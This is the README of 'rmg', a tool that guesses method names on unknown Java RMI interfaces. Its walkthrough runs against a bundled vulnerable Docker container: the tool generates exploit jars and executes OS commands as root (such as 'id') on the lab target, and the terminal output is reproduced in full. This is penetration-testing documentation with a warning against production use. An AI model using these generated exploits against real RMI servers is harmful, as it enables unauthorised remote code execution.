# rmg

A tool that helps you to identify juicy methods on unknown Java RMI interfaces.


### Remote Method Guessing

-----

Remote Method Guessing is a technique to identify vulnerable methods on Java interfaces that are exposed by Java RMI servers.
Before we talk about the tool, let us briefly talk about Java RMI to understand why it may be useful.


#### What is Java RMI?

The RMI part of Java RMI is an acronym and stands for *Remote Method Invocation*. This name is already quite verbose
and you probably guessed that it can be used to invoke methods remotely. With Java RMI, a RMI server can implement 
a certain class and make it available over the network. Other clients can then create instances of this class and 
invoke methods on them. The clue is, that these method calls are executed on the RMI server. The client does only
dispatch the method call and receives the result from the server. The following diagram tries to visualize the concept (super simplified):

![Java RMI](/resources/images/01-java-rmi.png)

Java RMI is a pretty handy technology, since it makes it simple to write a client server architecture without having
to implement the communication channel between client and server from scratch. For this reason, RMI endpoints can often 
be found on servers that run other software that is written in Java and they are a prime target to identify critical
security vulnerabilities.


#### The Registry

When a RMI server wants to expose a Java class over the network, it has to register the class on a RMI registry server.
The RMI registry is basically like a phone book. Then a client wants to instantiate a remote class, it looks up the name 
inside the RMI registry server, which responds with the location (ip:port) where the remote class is exposed. While the 
registry runs on a static port that is persistent during reboots, the ports of the different exposed RMI classes do usually change.
This is also the reason why the registry is actually needed. If you know port mappers, this situation may sounds familiar.


#### Hidden Interfaces

With the builtin methods of the Java RMI library one can easily dump the names of all registered classes on a RMI registry.
However, in order to instantiate a remote class, your Java Virtual Machine needs to know the remote class interface. In the actual use
cases of Java RMI this is of course reasonable, since a vendor can ship the class interfaces together with the actual client code.
But for a black box security assessment, it is pretty sad, since you may encounter promising remote class names like 'server-manager'
and cannot create instances of it.

Here comes Remote Method Guessing into play. The idea is pretty simple: We create an dummy interface for the class on our own and hope
that we hit some juicy methods. Such a dummy interface could e.g. look like this:

```java
package <PACKAGENAME>;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface <CLASSNAME> extends Remote {
    String exec(String dummy) throws RemoteException;
    String exec(String dummy, String dummy2) throws RemoteException;
    String exec(String dummy, String dummy2, String dummy3) throws RemoteException;
    String execute(String dummy) throws RemoteException;
    String execute(String dummy, String dummy2) throws RemoteException;
    String execute(String dummy, String dummy2, String dummy3) throws RemoteException;
    [...]
```

If we choose the placeholders according to the remote class-interface, we can create an instance of
it, even if our interface definition is not matching the one of the remote class-interface.

After we have created an instance, we can start to call methods on it. Each time we try to invoke a method that does not exist 
(and this will happen most of the time), the RMI server will throw an corresponding exception back to us. However, once we hit 
an existing method, the RMI server will respond with a different exception, like e.g. a NullPointer Exception. This enables us 
to identify juicy methods that are defined on the remote class and we are may able to profit from them.


### Installation

------

The remote-method-guesser (in the following *rmg*) is a *maven* project and the installation should be quite easy. With maven installed, just execute
the following command from within the project folder and you should find an executable *.jar* file ``rmg.jar`` inside the *target*
folder.

```
$ mvn package
```


### Example Workflow & Proof of Concept

-----

Inside this repository, a [Docker](./.docker) folder is included. This folder contains a ``docker-compose.yml`` file which starts/builts a
docker container that exposes some vulnerable classes via Java RMI. You can use this container for testing and to get a general feeling
for the tool. In the following I will use the provided container to demonstrate the usage of *rmg*. The IP address of the container is 172.18.0.2
for this demonstration.

A first indicator that *rmg* could be useful during a system level penetration test is then you identify a rmi-registry listening on the targeted server.
*nmap* is usually able to identify this, but the output of the service detection (``-sV``) is not always that clear. Often *nmap* is able to tell you
that a certain port provides a rmi-registry, but sometimes it marks the corresponding port only as *Java RMI*:

```
root@kali:/home/pentester# nmap -sV 172.18.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-04 06:51 CET
Nmap scan report for 172.18.0.2
Host is up (0.000033s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE  VERSION
1099/tcp open  java-rmi Java RMI
MAC Address: 02:42:AC:12:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.53 seconds
```

In such a situation you could use already existing tools like *nmap NSE scripts* or *Metasploit* to attempt to list all bound names from the probably listening rmi-registry.
However, *rmg* does also support such functionality, if you just invoke it with the ip address and the port of your target:

```
[pentester@kali rmg]$ ./rmg.jar 172.18.0.2 1099
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 2 names are bound to the registry.
[+] Listing bound names in registry:
[+]	• SuperCoolServer
[+]	• AnotherSuperCoolServer
```

Now you know that the corresponding port does indeed provide access to a rmi registry and you also know which names are bound to it. You can also request information
about the class interfaces, that the corresponding boundNames implement:

```
[pentester@kali rmg]$ ./rmg.jar -c 172.18.0.2 1099
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 2 names are bound to the registry.
[+] Listing bound names in registry:
[+]	• SuperCoolServer
[+]	  --> de.qtc.rmg.testserver.IServer (unknown class)
[+]	• AnotherSuperCoolServer
[+]	  --> de.qtc.rmg.testserver.IServer2 (unknown class)
```

As you can see, *rmg* flags the class interfaces as *unknown*, which means that the corresponding interface is not present inside your classpath.
Now we are at the point where you usually stop to investigate the bound objects on the rmi registry, since you just can't know which methods are exposed by them. 
However, with *rmg* we can further poke the exposed interfaces and may find some juicy functionality. 

When *rmg* is used with the ``-g`` switch, it will try to guess valid method names on all identified and unknown remote interfaces. For this process, a ``templates`` folder is required, 
that contains *wordlists* with method names that you want to guess. To be more detailed, these *wordlists* are actually Java interface files, but they basically yield the same purpose as a wordlist.
Additionally to the *wordlist-interfaces* also a *lookup-dummy* and a *exploit-template* are required. In this repository, you will find a ``templates`` folder that is fine for most
situations. Just make sure that you run *rmg* from within the same directory where the template folder is located or specify the templates folder location with the ``--templateFolder``
option.

By default, the method guessing procedure is quite verbose and the corresponding output will look like this:

```
[pentester@kali rmg]$ ./rmg.jar -g 172.18.0.2 1099
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 2 names are bound to the registry.
[+] Creating required folder 'sources'... done.
[+] Creating required folder 'build'... done.
[+] Creating required folder 'exploits'... done.
[+]
[+] Starting RMG Attack
[+]		2 template files found.
[+]		Compiling file ./templates/LookupDummy.java... done.
[+]
[+]	Current template file: 'StringTemplate.java'
[+]
[+]		Attacking boundName 'SuperCoolServer'.
[+]		Reading template file: './templates/StringTemplate.java'... done
[+]		Writing class './sources/IServer.java' to disk... done.
[+]		Compiling file ./sources/IServer.java... done.
[+]		Getting instance of 'SuperCoolServer'... done.
[+]		Guessing methods...
[+]
[+]			HIT: public abstract java.lang.String de.qtc.rmg.testserver.IServer.execute(java.lang.String) throws java.rmi.RemoteException --> exists!
[+]			HIT: public abstract java.lang.String de.qtc.rmg.testserver.IServer.system(java.lang.String,java.lang.String[]) throws java.rmi.RemoteException --> exists!
[+]
[+]		2 valid method names were identified for 'StringTemplate.java'.
[+]		Writing exploit for method 'execute'.
[+]		Reading template file: './templates/ExploitTemplate.java'... done
[+]		Preparing exploit... done.
[+]		Writing exploit './sources/IServerExecuteExploit.java' to disk... done.
[+]		Compiling file ./sources/IServerExecuteExploit.java... done.
[+]		Creating manifest for './exploits/IServerExecuteExploit.jar... done.
[+]		Creating ./exploits/IServerExecuteExploit.jar... done.
[+]
[+]		Writing exploit for method 'system'.
[+]		Reading template file: './templates/ExploitTemplate.java'... done
[+]		Preparing exploit... done.
[+]		Writing exploit './sources/IServerSystemExploit.java' to disk... done.
[+]		Compiling file ./sources/IServerSystemExploit.java... done.
[+]		Creating manifest for './exploits/IServerSystemExploit.jar... done.
[+]		Creating ./exploits/IServerSystemExploit.jar... done.
[+]
[+]		Attacking boundName 'AnotherSuperCoolServer'.
[+]		Reading template file: './templates/StringTemplate.java'... done
[+]		Writing class './sources/IServer2.java' to disk... done.
[+]		Compiling file ./sources/IServer2.java... done.
[+]		Getting instance of 'AnotherSuperCoolServer'... done.
[+]		Guessing methods...
[+]
[+]			HIT: public abstract java.lang.String de.qtc.rmg.testserver.IServer2.system(java.lang.String[]) throws java.rmi.RemoteException --> exists!
[+]
[+]		1 valid method names were identified for 'StringTemplate.java'.
[+]		Writing exploit for method 'system'.
[+]		Reading template file: './templates/ExploitTemplate.java'... done
[+]		Preparing exploit... done.
[+]		Writing exploit './sources/IServer2SystemExploit.java' to disk... done.
[+]		Compiling file ./sources/IServer2SystemExploit.java... done.
[+]		Creating manifest for './exploits/IServer2SystemExploit.jar... done.
[+]		Creating ./exploits/IServer2SystemExploit.jar... done.
[+]
[+]
[+]	Current template file: 'IntegerTemplate.java'
[+]
[+]		Attacking boundName 'SuperCoolServer'.
[+]		Reading template file: './templates/IntegerTemplate.java'... done
[+]		Writing class './sources/IServer.java' to disk... done.
[+]		Compiling file ./sources/IServer.java... done.
[+]		Getting instance of 'SuperCoolServer'... done.
[+]		Guessing methods...
[+]
[+]
[+]		0 valid method names were identified for 'IntegerTemplate.java'.
[+]		Attacking boundName 'AnotherSuperCoolServer'.
[+]		Reading template file: './templates/IntegerTemplate.java'... done
[+]		Writing class './sources/IServer2.java' to disk... done.
[+]		Compiling file ./sources/IServer2.java... done.
[+]		Getting instance of 'AnotherSuperCoolServer'... done.
[+]		Guessing methods...
[+]
[+]			HIT: public abstract int de.qtc.rmg.testserver.IServer2.execute(java.lang.String) throws java.rmi.RemoteException --> exists!
[+]
[+]		1 valid method names were identified for 'IntegerTemplate.java'.
[+]		Writing exploit for method 'execute'.
[+]		Reading template file: './templates/ExploitTemplate.java'... done
[+]		Preparing exploit... done.
[+]		Writing exploit './sources/IServer2ExecuteExploit.java' to disk... done.
[+]		Compiling file ./sources/IServer2ExecuteExploit.java... done.
[+]		Creating manifest for './exploits/IServer2ExecuteExploit.jar... done.
[+]		Creating ./exploits/IServer2ExecuteExploit.jar... done.
[+]
[+] Successfully guessed methods:
[+]	• SuperCoolServer
[+]		--> public abstract java.lang.String de.qtc.rmg.testserver.IServer.execute(java.lang.String) throws java.rmi.RemoteException
[+]		--> public abstract java.lang.String de.qtc.rmg.testserver.IServer.system(java.lang.String,java.lang.String[]) throws java.rmi.RemoteException
[+]	• AnotherSuperCoolServer
[+]		--> public abstract java.lang.String de.qtc.rmg.testserver.IServer2.system(java.lang.String[]) throws java.rmi.RemoteException
[+]		--> public abstract int de.qtc.rmg.testserver.IServer2.execute(java.lang.String) throws java.rmi.RemoteException
```

If you do no like that verbose output, you may run *rmg* with the ``-q`` switch, to reduce the verbosity to a minimum:

```
[pentester@kali rmg]$ ./rmg.jar -g -q 172.18.0.2 1099
[+] Successfully guessed methods:
[+]	• SuperCoolServer
[+]		--> public abstract java.lang.String de.qtc.rmg.testserver.IServer.execute(java.lang.String) throws java.rmi.RemoteException
[+]		--> public abstract java.lang.String de.qtc.rmg.testserver.IServer.system(java.lang.String,java.lang.String[]) throws java.rmi.RemoteException
[+]	• AnotherSuperCoolServer
[+]		--> public abstract java.lang.String de.qtc.rmg.testserver.IServer2.system(java.lang.String[]) throws java.rmi.RemoteException
[+]		--> public abstract int de.qtc.rmg.testserver.IServer2.execute(java.lang.String) throws java.rmi.RemoteException
```

As you can see, *rmg* was able to identify four valid method names on the exposed remote interfaces. The corresponding method names (*execute* and *system*), indicate
that sensitive functionality could be implemented on the server side and that we may be able to exploit the exposed interfaces. But how do we take advantage of that?
Well, theoretically you could now take the information from above to write your own RMI client to access the corresponding functions on the remote interfaces.
But this is of course a tedious work and writing this in Java is quite time consuming. Luckily, *rmg* handles the creation of exploit code automatically for you.

After *rmg* was executed, you will find some new folders inside your current working directory:

```
[pentester@kali rmg]$ ls
build  exploits  rmg.jar  sources  templates
```

The folders ``build`` and ``sources`` are just temporary folders that were used for interface and exploit creation. The more interisting stuff can be found inside the
``exploits`` folder:

```
[pentester@kali rmg]$ ls -l exploits/
total 48
-rw-r--r-- 1 pentester pentester 9680 Nov  4 07:20 IServer2ExecuteExploit.jar
-rw-r--r-- 1 pentester pentester 9686 Nov  4 07:20 IServer2SystemExploit.jar
-rw-r--r-- 1 pentester pentester 9682 Nov  4 07:20 IServerExecuteExploit.jar
-rw-r--r-- 1 pentester pentester 9680 Nov  4 07:20 IServerSystemExploit.jar
```

In this folder, *rmg* has created one executable *.jar* file for each successfully guessed remote method. If you just execute one of the *.jar* files without any arguments, you will 
see the following:

```
[pentester@kali rmg]$ java -jar exploits/IServerExecuteExploit.jar 
[+] To run the exploit, use the ``-x`` switch and specify the required arguments.
[+] If you need to specify a String array (String[]) as argument, use '<SEP>' as array seperator.
[+] The method signature is: public abstract java.lang.String de.qtc.rmg.testserver.IServer.execute(java.lang.String) throws java.rmi.RemoteException
```

Like the help suggests, you can then use the *-x* switch, to call the corresponding remote method with user defined arguments:

```
[pentester@kali rmg]$ java -jar exploits/IServerExecuteExploit.jar -x id
[+] Connecting to registry on 172.18.0.2:1099... done!
[+] Starting lookup on SuperCoolServer... done!
[+] Invoking method execute... done!
[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
```

As you can see, in the above case the *system* method on the *IServer* remote interface was indeed just a wrapper around a command shell and we were able to execute an operating system command.
This is of course the best you can hope for.

One special case of using the exploits provided by *rmg* occurs, when interfaces require a string array (*String[]*) as one of their arguments, like the *system* function from the *IServer* interface.
In this case, the exploit code will try to convert your arguments to a string array automatically, by using the marker ``<SEP>`` as a separator:

```
[pentester@kali rmg]$ java -jar exploits/IServerSystemExploit.jar -x ls "-l<SEP>-a"
[+] Connecting to registry on 172.18.0.2:1099... done!
[+] Starting lookup on SuperCoolServer... done!
[+] Invoking method system... done!
[+] The servers response is: total 24drwxr-xr-x 1 root root 4096 Nov  3 14:14 .drwxr-xr-x 1 root root 4096 Nov  3 14:14 ..-rw-r--r-- 1 root root  275 Nov  3 14:03 Dockerfiledrwxr-xr-x 3 root root 4096 Nov  3 14:14 de-rw-r--r-- 1 root root  207 Nov  3 14:06 entrypoint.shdrwxr-xr-x 2 root root 4096 Nov  3 14:14 src
```

If you want to clean the directory structure that was created by *rmg*, just type:

```
[pentester@kali rmg]$ ./rmg.jar clean
[pentester@kali rmg]$ ls
rmg.jar  templates
```


### Templates

-----

Like already mentioned, *rmg* ships some default templates that are fine for most situations. These default templates include currently:

* Juicy method names that take up to three *String* or *String[]* arguments and return *String*
* Juicy method names that take up to three *String* or *String[]* arguments and return *int*

It is of course possible that remote interfaces define juicy methods with other type signatures and you may want to extend the provided
interfaces or to create a new one. 

To extend an interface, simply add your desired method signatures to the existing template files. However, notice that Java allows only 
one return type per method name with the same argument signature. Thus, if you want to add method signatures for other return types, 
you need to add a new template file. 

For new template files, just make sure that they have a form of ``*Template.java`` and they should be recognized by *rmg*. Of course, also 
make sure that they follow the same format as the already existing template files.

The ``ExploitTemplate.java`` is not a *wordlist-template*, but is only used for exploit generation. It is currently designed to work
with *String* and *String[]* argument types. If you want exploit-support for your 
own template files, you probably need to adjust the template. However, since making this in a general applying manner can be difficult, 
you can also just edit the exploit sourcecode in the ``sources`` folder, after *rmg* has created the corresponding code.

The ``LookupDummy.java`` is also not a *wordlist-template*, but the way how Java class loading works, it requires that this file exist. Just
leave it untouched and do not care about it (unless you know what you do).


### Configuration

-----

*rmg* does provide some command line switches to modify its behavior. However, typing and remembering all these switches might be a pain
and therefore you can also use a configuration file for some of them. The default configuration file that is used by *rmg* internally looks
like this:

```properties
templateFolder  = ./templates
outputFolder    = ./exploits
sourceFolder    = ./sources
buildFolder     = ./build

javacPath = /usr/bin/javac
jarPath = /usr/bin/jar

threads = 5
```

You can just create a *.properties* file with you own configuration and feed it into *rmg* using the ``--config`` option.


### About Performance

-----

The remote-method-guesser was not designed with performance in mind. Even the actual method guessing procedure is multi threaded, all the slow stuff,
like the compilation of dummy interfaces or exploit classes is done single threaded. From my point of view this behavior is totally fine, since I never encountered
a real world scenario where a higher performance was required. If you think differently, feel free to improve the code in that regard.


### A word of caution

-----

Remote Method Guessing should not be used on production systems. The reason is simple: During the method guessing process, the method 
guesser will try to invoke each method from the template file on the remote object. Even this is a dummy call (with all arguments set to
*null*), it is still a valid Java function call and depending on the implementation of the remote class, bad things could happen.

Consider a developer thought it might be a good idea to create a ``command(String cmd)`` function, that executes the specified command, but
shuts down the server after the execution has finished. Starting Remote Method Guessing on such 
a remote class would shutdown the server pretty quickly. This example is may a little bit extreme, but also other bad side effects could occur.

Invoking blindly Java methods on a production system is dangerous and should not be done.


### Current Project State

-----

It should also be noticed that RMG was never fully tested and that it was developed by a non-Java developer. It might contain several bugs and there is no gurantee that
it works for you. If you encounter/find any issues, feel free to submit issues/pull-requests for them.
